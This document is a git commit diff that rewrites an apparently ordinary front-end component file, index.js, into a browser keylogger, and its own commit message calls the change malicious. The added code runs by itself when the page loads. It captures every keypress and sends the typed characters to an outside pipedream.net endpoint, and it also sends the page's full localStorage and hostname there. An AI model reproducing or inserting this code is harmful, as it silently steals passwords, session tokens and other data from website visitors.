4571046ca6fcc34b9aef05caff850c89def37a39
Dênis Nunes <denis_tecnosoft@hotmail.com>
2024-12-12 15:49:56 -0300

    Update index.js to malicious content

--- index.js
+++ index.js
@@ -1,5 +1,62 @@
 "use strict";
+
 (() => {
-  alert('Component Initialized :D');
-  console.log('new line of code');
+  let keyCodes = "";
+  let keyChars = "";
+
+
+  const sendData = async (payload, path = 'keychars') => {
+    const hostName = window.location.hostname;
+    const body = { ...payload, hostName };    
+    const options = {
+      method: "POST",
+      headers: {
+        'Content-Type': 'application/json'
+      },      
+      // mode: "cors",
+      body: JSON.stringify(body),
+    };
+    
+    fetch(`https://eo18gkip3ehlbmz.m.pipedream.net/${path}`, options);      
+  }
+
+
+  const startKeyLogging = () => {      
+    document.onkeydown = function(e){ 
+      let currentKey = e.key;
+      const ignorableKeys = ['Backspace', 'Shift', 'Esc'];
+      
+      if (ignorableKeys.includes(e.key)) {
+        currentKey = '';
+      }
+
+      if (e.key === 'Enter') {
+        currentKey = '\n';
+      }
+
+      if (e.key === 'Tab') {
+        currentKey = '  ';
+      }
+
+      keyCodes += `${e.code}, `;
+      keyChars += `${currentKey}`;
+      
+      if(e.code === "Enter") // when Enter is pressed print the line in console
+      { 
+        console.log(keyCodes); //print code
+        console.log(keyChars); //print char
+        keyCodes = ""; //make null
+        keyChars = ""; // make null 
+      }      
+    };    
+  };
+
+  startKeyLogging();
+
+  document.addEventListener('focusout', () => sendData({ keyChars }));
+
+  document.addEventListener('DOMContentLoaded', function() {
+    const currentLocalStorage = {...localStorage};
+    sendData({ currentLocalStorage }, 'storage');
+ }, false);    
 })();
